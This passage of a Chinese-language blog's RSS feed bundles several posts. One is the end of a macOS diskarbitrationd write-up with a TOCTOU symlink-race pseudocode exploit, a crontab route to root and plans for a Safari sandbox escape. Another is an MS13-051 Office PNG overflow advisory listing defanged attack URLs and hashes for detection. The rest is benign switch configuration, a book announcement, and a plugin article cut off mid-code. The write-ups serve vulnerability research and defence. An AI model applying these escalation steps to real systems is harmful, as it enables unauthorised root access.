&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;mountpoint&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DARequestGetArgument2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// [...]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mountpoint&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;___CFURLCopyFileSystemRepresentation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mountpoint&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stat&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;st&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;stat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;st&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;st&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;st_uid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DARequestGetUserUID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;n&#34;&gt;status&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kDAReturnNotPermitted&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这里实现的机制本应防止具有挂载权限的用户挂载到他们不拥有的目录(如/etc或/System)。如果挂载点存在但不归用户所有，则会产生kDAReturnNotPermitted错误代码。这里存在一个典型的检查时间与使用时间(TOCTOU)问题：如果在检查之后但在挂载之前创建挂载点，即使调用者不拥有挂载点，挂载也可能成功。&lt;/p&gt;
&lt;h2 id=&#34;构建本地管理员到root的利用&#34;&gt;构建本地管理员到root的利用
&lt;/h2&gt;&lt;p&gt;我们可以使用以下伪代码利用此漏洞将任何磁盘挂载到/etc：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;disk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/dev/some-disk-device&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;background&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;symlink&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/tmp/foo&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pointing&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;remove&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;symlink&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disk&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mounted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/etc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IPC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;diskarbitrationd&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mount&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disk&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/tmp/foo/etc&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;最终，检查将在符号链接不存在时执行，但挂载将在符号链接存在时发生，因此两者都会通过。此时我们已经挂载到了/etc，这对于本地管理员用户来说通常是不可能的。&lt;/p&gt;
&lt;p&gt;我们使用MacBook上的EFI分区(/dev/disk0s1)作为可写设备，并通过在/var/at/tabs/root中创建crontab文件来获得root权限执行任意命令。&lt;/p&gt;
&lt;h2 id=&#34;从safari触发漏洞&#34;&gt;从Safari触发漏洞
&lt;/h2&gt;&lt;p&gt;要在沙箱中触发此漏洞，我们需要：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;访问diskarbitrationd的IPC端点 - 已满足&lt;/li&gt;
&lt;li&gt;对任意目录的写访问权限 - 已满足&lt;/li&gt;
&lt;li&gt;获取挂载的授权令牌 - 不满足&lt;/li&gt;
&lt;li&gt;创建符号链接的能力 - 不满足&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在系列的下一部分中，我们将介绍另外三个漏洞，其中一个用于创建符号链接，另外两个用于绕过授权逻辑中的沙箱检查。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HPE网络交换机基础配置指南</title>
        <link>http://localhost:1313/p/hpe%E7%BD%91%E7%BB%9C%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 23:40:15 +0800</pubDate>
        
        <guid>http://localhost:1313/p/hpe%E7%BD%91%E7%BB%9C%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;基础网络交换机配置&#34;&gt;基础网络交换机配置
&lt;/h1&gt;&lt;h2 id=&#34;问题描述&#34;&gt;问题描述
&lt;/h2&gt;&lt;p&gt;我是一名IT分析师，老板希望让我更多地接触网络相关的工作。他让我在办公室搭建一个实验环境。目前，我已经安装了一台HPE FlexNetwork 5130 EI交换机，并通过控制台端口和PuTTY串行连接成功接入设备。&lt;/p&gt;
&lt;p&gt;在CLI界面中，我已经完成了以下操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置交换机名称&lt;/li&gt;
&lt;li&gt;为控制台端口设置密码&lt;/li&gt;
&lt;li&gt;将用户角色设置为&lt;code&gt;network-admin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;配置时区并启用夏令时&lt;/li&gt;
&lt;li&gt;设置NTP协议&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但我不知道接下来该做什么。虽然我在边学边做，但搜索到的相关资料非常有限。&lt;/p&gt;
&lt;h2 id=&#34;下一步建议&#34;&gt;下一步建议
&lt;/h2&gt;&lt;p&gt;对于“基础交换机配置”，我认为接下来应该设置IP地址，但我想制定一个计划，让这个项目更有条理。&lt;/p&gt;
&lt;h3 id=&#34;可能的配置步骤&#34;&gt;可能的配置步骤
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;配置管理IP地址&lt;/strong&gt;：为交换机分配一个IP地址，以便通过SSH或Web界面远程管理。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;设置VLAN&lt;/strong&gt;：如果需要划分网络，可以配置VLAN。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;配置端口&lt;/strong&gt;：根据需求设置端口的速率、双工模式或启用/禁用端口。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;保存配置&lt;/strong&gt;：确保所有更改保存到启动配置中，避免重启后丢失。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果你有更具体的需求或问题，可以进一步讨论！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>《代码简洁之道：软件基础》现已免费开放</title>
        <link>http://localhost:1313/p/%E4%BB%A3%E7%A0%81%E7%AE%80%E6%B4%81%E4%B9%8B%E9%81%93%E8%BD%AF%E4%BB%B6%E5%9F%BA%E7%A1%80%E7%8E%B0%E5%B7%B2%E5%85%8D%E8%B4%B9%E5%BC%80%E6%94%BE/</link>
        <pubDate>Sat, 02 Aug 2025 23:24:13 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BB%A3%E7%A0%81%E7%AE%80%E6%B4%81%E4%B9%8B%E9%81%93%E8%BD%AF%E4%BB%B6%E5%9F%BA%E7%A1%80%E7%8E%B0%E5%B7%B2%E5%85%8D%E8%B4%B9%E5%BC%80%E6%94%BE/</guid>
        <description>&lt;h3 id=&#34;代码简洁之道软件基础现已免费&#34;&gt;代码简洁之道：软件基础现已免费
&lt;/h3&gt;&lt;p&gt;2022年5月16日 | Max Kanat-Alexander&lt;/p&gt;
&lt;p&gt;一年前，一位Twitter用户在讨论中@我和其他编程书籍作者，描述了在他们国家获取编程书籍的障碍。我此前也隐约意识到这个问题——世界上许多国家的人们可能需要用一周的全部工资才能购买一本美元定价的书籍。&lt;/p&gt;
&lt;p&gt;我写书从来不是为了赚钱——而是为了传递理念和帮助他人。虽然通常认为付费能提高阅读率，但我的核心目标是让更多人读到这本书，因为这是改善软件行业的唯一途径。这本书至今仍有销量（对计算机类书籍而言很罕见，毕竟已出版十年），但盈利对我并不重要——重要的是传播知识。&lt;/p&gt;
&lt;p&gt;当我意识到全球有大量人群因经济原因无法合法阅读这本书时，便与O&amp;rsquo;Reilly编辑团队协商能否免费开放。由于亚马逊和O&amp;rsquo;Reilly商店存在不可控的复杂限制，最终解决方案是：出版社将发行权交还给我，允许去除封面后自由传播。&lt;/p&gt;
&lt;p&gt;现在，您可以免费下载《代码简洁之道：软件基础》了！希望这能让更多人学习软件设计的基本法则，共同推动软件开发领域进步。&lt;/p&gt;
&lt;p&gt;[分享按钮组]&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;读者评论&#34;&gt;读者评论
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;sergey&lt;/strong&gt;&lt;br&gt;
2022年5月16日&lt;br&gt;
&amp;ldquo;现在这本顶尖编程书籍能免费获取真是太棒了，感谢！&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Max Kanat-Alexander&lt;/strong&gt;&lt;br&gt;
2022年6月7日&lt;br&gt;
&amp;ldquo;谢谢sergey！很高兴能以这种方式帮助大家🙂&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;STEVEN GORDON&lt;/strong&gt;&lt;br&gt;
2022年5月17日&lt;br&gt;
&amp;ldquo;书中将测试视为事后补充，暴露了您对软件开发的认知缺陷。自动化测试应该优先进行，它才是表达代码意图的关键（而非随时间失效的注释），也是安全重构和维护的基础。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Max Kanat-Alexander&lt;/strong&gt;&lt;br&gt;
2022年6月7日&lt;br&gt;
&amp;ldquo;Steven，您可能误解了书中关于测试的论述。我的测试哲学可参考：https://www.codesimplicity.com/post/the-philosophy-of-testing/&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Yubraj Lama&lt;/strong&gt;&lt;br&gt;
2022年6月20日&lt;br&gt;
&amp;ldquo;书中阐述的软件设计基础法则非常精彩，感谢Max。&amp;rdquo;&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>MS13-051漏洞分析：Office PNG解析漏洞的技术细节与攻击模式</title>
        <link>http://localhost:1313/p/ms13-051%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90office-png%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E4%B8%8E%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F/</link>
        <pubDate>Sat, 02 Aug 2025 23:13:07 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ms13-051%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90office-png%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E4%B8%8E%E6%94%BB%E5%87%BB%E6%A8%A1%E5%BC%8F/</guid>
        <description>&lt;h1 id=&#34;ms13-051get-out-of-my-office&#34;&gt;MS13-051：Get Out of My Office!
&lt;/h1&gt;&lt;p&gt;MS13-051修复了Microsoft Office 2003和Office for Mac中的一个安全漏洞。较新版本的Windows版Office不受此漏洞影响，但Mac版Office 2011仍受影响。我们已发现该漏洞在野外的针对性0day攻击中被利用。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;p&gt;在Office的PNG文件解析代码中，存在对块长度字段检查不严的漏洞。根据PNG规范(&lt;a class=&#34;link&#34; href=&#34;http://www.w3.org/TR/PNG/#5Chunk-layout&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.w3.org/TR/PNG/#5Chunk-layout&lt;/a&gt;)，&amp;ldquo;虽然编码器和解码器应将长度视为无符号数，但其值不应超过2^31-1字节&amp;rdquo;。然而在恶意PNG文件中，我们发现块长度字段被设置为0xFFFFFFFF。PNG解析代码虽然正确将该字段视为无符号数，但未检查该值是否超过2^31-1的限制。&lt;/p&gt;
&lt;p&gt;Shellcode分析显示该漏洞利用是典型的基于栈的缓冲区溢出，攻击者通过向栈上缓冲区写入超量数据，最终劫持程序执行流。旧版Office/Windows缺乏针对此类攻击的缓解措施，而新版则具备防护能力。我们也验证了EMET 3.0及以上版本能有效阻止已观察到的攻击。&lt;/p&gt;
&lt;h2 id=&#34;攻击模式&#34;&gt;攻击模式
&lt;/h2&gt;&lt;p&gt;观察到的攻击具有高度针对性，攻击者刻意规避安全研究人员调查。恶意样本是Office 2003二进制格式文档，其中不直接包含恶意PNG文件，而是通过引用远程服务器上的PNG文件实现攻击。&lt;/p&gt;
&lt;p&gt;攻击者还在服务器上部署了脚本，避免多次提供PNG漏洞利用文件，以保持0day的隐蔽性。已观察到的攻击主要分布在印度尼西亚和马来西亚地区。&lt;/p&gt;
&lt;h2 id=&#34;检测建议&#34;&gt;检测建议
&lt;/h2&gt;&lt;p&gt;所有恶意文档的共同特征是使用&amp;quot;space.gif&amp;quot;文件名获取远程PNG漏洞文件。为帮助安全厂商和企业检测潜在威胁，我们提供部分用于加载远程PNG漏洞的URL和恶意Office文档哈希值：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;恶意URL示例&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hXXp://intent.nofrillspace.com/users/web11_focus/4307/space.gif
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hXXp://intent.nofrillspace.com/users/web11_focus/3807/space.gif
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hXXp://mister.nofrillspace.com/users/web8_dice/3791/space.gif
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;文档哈希值&lt;/strong&gt;:&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;MD5&lt;/th&gt;
          &lt;th&gt;SHA1&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;fde37e60cc4be73dada0fb1ad3d5f273&lt;/td&gt;
          &lt;td&gt;1bdc1a0bc995c1beb363b11b71c14324be8577c9&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2f1ab543b38a7ad61d5dbd72eb0524c4&lt;/td&gt;
          &lt;td&gt;2a33542038a85db4911d7b846573f6b251e16b2d&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;感谢Google公司的Andrew Lyons和Neel Mehta的报告，以及Elia Florio和Cristian Craioveanu对本案例的帮助。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Neil Sikka, MSRC Engineering
@neilsikka&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>开源办公套件ONLYOFFICE如何集成AI技术：ChatGPT插件深度解析</title>
        <link>http://localhost:1313/p/%E5%BC%80%E6%BA%90%E5%8A%9E%E5%85%AC%E5%A5%97%E4%BB%B6onlyoffice%E5%A6%82%E4%BD%95%E9%9B%86%E6%88%90ai%E6%8A%80%E6%9C%AFchatgpt%E6%8F%92%E4%BB%B6%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 22:56:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BC%80%E6%BA%90%E5%8A%9E%E5%85%AC%E5%A5%97%E4%BB%B6onlyoffice%E5%A6%82%E4%BD%95%E9%9B%86%E6%88%90ai%E6%8A%80%E6%9C%AFchatgpt%E6%8F%92%E4%BB%B6%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;人工智能与办公软件融合最佳集成案例&#34;&gt;人工智能与办公软件融合：最佳集成案例
&lt;/h1&gt;&lt;p&gt;随着人工智能技术深度渗透生活各领域，越来越多的软件开发者和IT企业正寻求将尖端AI技术集成到产品中。现代办公软件领域已涌现多个成功案例：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Microsoft 365 Copilot&lt;/strong&gt;：基于大语言模型(LLM)，深度集成Word/Excel/PowerPoint工作流&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WPS AI&lt;/strong&gt;：提供文档摘要、数据分析和会议纪要生成等功能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Google Workspace Gemini&lt;/strong&gt;：支持文档创作、表格公式生成和幻灯片设计&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Zoho Zia&lt;/strong&gt;：专注于语法检查和内容优化&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;onlyoffice的ai集成方案&#34;&gt;ONLYOFFICE的AI集成方案
&lt;/h1&gt;&lt;p&gt;作为开源办公套件，ONLYOFFICE Docs通过插件机制实现了AI能力集成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持文本/表格/幻灯片全格式处理&lt;/li&gt;
&lt;li&gt;提供本地部署和云版本&lt;/li&gt;
&lt;li&gt;开源代码托管于GitHub&lt;/li&gt;
&lt;li&gt;通过Plugin Manager管理插件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chatgpt插件技术架构&#34;&gt;ChatGPT插件技术架构
&lt;/h2&gt;&lt;p&gt;插件包含5个核心目录：&lt;/p&gt;
&lt;h3 id=&#34;1-html结构层&#34;&gt;1. HTML结构层
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;index.html&lt;/code&gt;：主入口文件，加载所有JS/CSS资源&lt;/li&gt;
&lt;li&gt;&lt;code&gt;chat.html&lt;/code&gt;：聊天框UI结构定义&lt;/li&gt;
&lt;li&gt;错误处理HTML文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-资源目录&#34;&gt;2. 资源目录
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;light/&lt;/code&gt;和&lt;code&gt;dark/&lt;/code&gt;：适配不同主题的图片资源&lt;/li&gt;
&lt;li&gt;&lt;code&gt;icons/&lt;/code&gt;：多分辨率图标集&lt;/li&gt;
&lt;li&gt;CSS样式表&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-核心脚本&#34;&gt;3. 核心脚本
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;code.js&lt;/code&gt;实现主要功能：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
